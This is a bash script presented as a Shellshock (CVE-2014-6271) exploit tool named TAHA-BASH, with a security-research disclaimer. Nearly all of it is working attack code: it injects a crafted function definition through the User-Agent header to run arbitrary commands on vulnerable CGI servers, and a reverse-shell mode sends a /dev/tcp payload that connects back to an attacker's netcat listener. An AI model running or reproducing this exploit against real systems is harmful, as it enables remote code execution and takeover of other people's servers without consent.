#!/bin/bash

# ==================================================
# ShellShock Exploit Tool (CVE-2014-6271)
# Author : mtaha-sec(Mohamed Taha Aboumehdi Hassani)
# Purpose: Security research & educational use only
# ==================================================

# ---------- COLORS ----------
RED="\e[31m"
GREEN="\e[32m"
BLUE="\e[34m"
YELLOW="\e[33m"
RESET="\e[0m"

# ---------- BANNER ----------
banner() {
    echo -e "${GREEN}"
    cat << "EOF"
████████╗ █████╗ ██╗  ██╗ █████╗     ██████╗  █████╗ ███████╗██╗  ██╗
╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗    ██╔══██╗██╔══██╗██╔════╝██║  ██║
   ██║   ███████║█████╔╝ ███████║    ██████╔╝███████║███████╗███████║
   ██║   ██╔══██║██╔═██╗ ██╔══██║    ██╔══██╗██╔══██║╚════██║██╔══██║
   ██║   ██║  ██║██║  ██╗██║  ██║    ██████╔╝██║  ██║███████║██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
               TAHA-BASH | ShellShock Exploit Tool
EOF
    echo -e "${RESET}"
}

# ---------- USAGE ----------
usage() {
    echo -e "${YELLOW}Usage:${RESET}"
    echo "  $0 <target_url> <command>"
    echo "  $0 --reverse <target_url> <LHOST> <LPORT>"
    echo
    echo -e "${YELLOW}Examples:${RESET}"
    echo "  $0 http://target/cgi-bin/test.cgi 'id'"
    echo "  $0 --reverse http://target/cgi-bin/test.cgi 192.168.1.10 4444"
    exit 1
}

# ---------- COMMAND EXECUTION ----------
# This function sends a crafted HTTP request using the User-Agent header
# to test if the target is vulnerable to Shellshock.
send_exploit() {
    local target="$1"
    local cmd="$2"
    local payload="() { :; }; $cmd"

    echo -e "${BLUE}[+] Testing target for Shellshock vulnerability...${RESET}"
    echo -e "${BLUE}[i] Target  : $target${RESET}"
    echo -e "${BLUE}[i] Command : $cmd${RESET}"

    response=$(curl -s -H "User-Agent: $payload" "$target")

    if [[ -z "$response" ]]; then
        echo -e "${RED}[-] No output received.${RESET}"
        echo -e "${RED}[-] Target may be patched or not vulnerable.${RESET}"
    else
        echo -e "${GREEN}[+] Target appears vulnerable!${RESET}"
        echo -e "${GREEN}[+] Command output:${RESET}"
        echo "$response"
    fi
}

# ---------- REVERSE SHELL ----------
# Sends a reverse shell payload to the vulnerable server.
# The attacker must start a netcat listener beforehand.
reverse_shell() {
    local target="$1"
    local host="$2"
    local port="$3"

    echo -e "${BLUE}[+] Preparing reverse shell payload...${RESET}"
    echo -e "${GREEN}[i] Start your listener:${RESET} nc -lvnp $port"

    payload="bash -i >& /dev/tcp/$host/$port 0>&1"

    curl -s -H "User-Agent: () { :; }; $payload" "$target"

    echo -e "${GREEN}[+] Payload sent. Waiting for connection...${RESET}"
}

# ---------- MAIN ----------
banner

# Reverse shell mode
if [[ "$1" == "--reverse" ]]; then
    [[ $# -ne 4 ]] && usage
    reverse_shell "$2" "$3" "$4"
    exit 0
fi

# Command execution mode
[[ $# -ne 2 ]] && usage
send_exploit "$1" "$2"
